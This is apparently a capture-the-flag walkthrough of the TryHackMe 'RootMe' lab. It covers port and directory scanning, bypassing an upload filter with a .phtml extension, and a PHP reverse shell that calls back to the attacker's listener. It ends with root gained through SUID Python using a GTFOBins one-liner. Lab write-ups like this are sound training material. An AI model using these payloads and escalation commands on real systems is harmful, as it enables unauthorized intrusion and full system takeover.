# RootMe

[Play](https://tryhackme.com/room/rrootme)

## 1. Scanning & Enumeration
### 1.1 Port Scanning
```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.35.149
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 01:18 EDT
Nmap scan report for 10.10.35.149
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.57 seconds
```

While go buster and nmap runs, I wanted to see if the website is built on php or not. The following works!

`http://10.10.35.149/index.php`

### 1.2 Web Enumeration
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.35.149 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
/uploads              (Status: 301) [Size: 314] [--> http://10.10.35.149/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.35.149/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.35.149/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.35.149/panel/]
```

Panel looks interesting, so let’s try uploading a README.md file (of this repo).

![https://i.imgur.com/1xtAlAB.png](https://i.imgur.com/1xtAlAB.png)

Success! Let’s check the uploads page.

![https://i.imgur.com/XV6CLIc.png](https://i.imgur.com/XV6CLIc.png)


### 1.3 Revshell Time
Time for a phpreverseshell. Go to pentestmonkey or revshells.com and get the php one.

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.150.214';
$port = 1337;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;
...
```

Okay, time for uploading! ... and we get 

![A screenshot of rejected message from the uploads page](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1a725c9-6fa3-471a-890e-ed702dc32876/Untitled.png)

Clearly the extension is working against us, since `.md` passed. 

So let's see what other extensions are allowed. [Source](https://www.guru99.com/what-is-php-first-php-program.html)

- .phtml
- .php3
- .php4
- .php5
- .phps

Okay. One by one.

## 2. Foothold

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d4cc0a26-2daa-4b74-82bc-afc81ac4bed0/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d4cc0a26-2daa-4b74-82bc-afc81ac4bed0/Untitled.png)

Ha! `.phtml` works! Lesgooo

```
┌──(kali㉿kali)-[/tmp]
└─$ nc -lvnp 1337      
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.35.149] 33678
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 05:39:36 up 30 min,  0 users,  load average: 0.00, 0.01, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/                                                                                 
$ ls                                                                              
bin                                                                               
boot                                                                              
cdrom                                                                             
dev
... 
```

## 3. PrivEsc

```
www-data@rootme:/home/rootme$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null                                                                                                                                   
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                             
/usr/lib/snapd/snap-confine                                                                                                                                             
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
...
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

python thing looks interesting. [gtfobins](https://gtfobins.github.io/gtfobins/python/#suid) ftw!

```
www-data@rootme:/$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
<hon -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
bash -i
bash: cannot set terminal process group (891): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$
```

We are done!
